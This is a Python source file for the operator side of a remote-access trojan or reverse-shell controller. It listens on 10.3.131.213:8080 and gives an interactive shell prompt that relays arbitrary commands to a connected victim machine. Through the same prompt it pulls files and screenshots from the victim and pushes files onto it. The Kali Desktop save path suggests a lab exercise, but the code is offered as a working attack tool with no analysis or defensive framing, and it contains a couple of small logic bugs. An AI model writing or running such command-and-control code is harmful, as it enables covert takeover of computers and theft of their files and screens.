import socket
import os

def doSend(mysocket, sourcePath, destinationPath, fileName):
    try:
        full_path = os.path.join(sourcePath, fileName)
        print(f"[~] Looking for file {full_path}")
        # check if file exists
        if not os.path.exists(full_path):
            mysocket.send(b"File not found")
            print(f"File does not exist:{full_path}")
            return
        # check if file is empty
        if os.path.getsize(full_path) == 0:
            mysocket.send(b"File is empty")
            print(f"File is empty:{full_path}")

        #send file data
        with open(full_path, 'rb') as sourceFile:
            while True:
                packet = sourceFile.read(1024)
                if not packet:
                    break
                mysocket.send(packet)
            mysocket.send(b'DONE')
            print("[+] File transfer Completed")

    except Exception as e:
        mysocket.send(b"File transfer error")
        print(f"[-] Error during file send{str(e)}")



def doGrab(conn, userinput,operation):
    try:
        conn.send(userinput.encode())  # Send command to client
        path = "/home/kali/Desktop/test.txt"
        # Ensure the directory exists
        os.makedirs(path, exist_ok=True)

        if operation =="grab":
            parts = userinput.split("*")
            if len(parts) < 2:
                print("[-] Invalid grab command format")
                return
            _, sourcePathAsFileName = parts
            fileName = "grabbed_" + os.path.basename(sourcePathAsFileName)

        elif operation == "screenCap":
            fileName = "screenshot.jpg"

        file_path = os.path.join(path,fileName)
        with open(file_path, 'ab') as f:
            while True:
                bits = conn.recv(1024)
                if not bits:
                    break
                if bits.endswith(b'DONE'):
                    f.write(bits[:-4])
                    print('[-] Transfer completed!')
                    break
                if b'File not found' in bits:
                    print('[-] Unable to find the file')
                    return
                f.write(bits)

        print(f"File saved as: {fileName}")
        print(f"Location: {path}")
    except Exception as e:
        print(f"[-] Error in file transfer: {e}")

def amalan():
    mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    mysocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    mysocket.bind(("10.3.131.213",8080))
    mysocket.listen(1)
    print("[+]  Listening for connections...")

    conn, address = mysocket.accept()
    print(f"[+] Connection established with: {address}")
    while True:
        try:
            userinput = input("Shell > ").strip()
            if userinput.lower() == "tem":
                conn.send(b"tem")
                conn.close()
                break


            elif userinput.startswith("grab"):
                doGrab(conn, userinput, "grab")

            elif 'send' in userinput:
                sendCmd,destination, fileName = userinput.split("*")
                source = input("Source path: ")
                conn.send(userinput.encode())
                doSend(conn,source, destination,fileName)

            elif "screenCap" in userinput:
                doGrab(conn, userinput,"screenCap" )

            else:
                conn.send(userinput.encode())
                response = conn.recv(1024).decode(errors='ignore')
                print(response)
        except Exception as e:
            print(f"[-] Error: {e}")

def main():
    amalan()
if __name__ == "__main__":
    main()
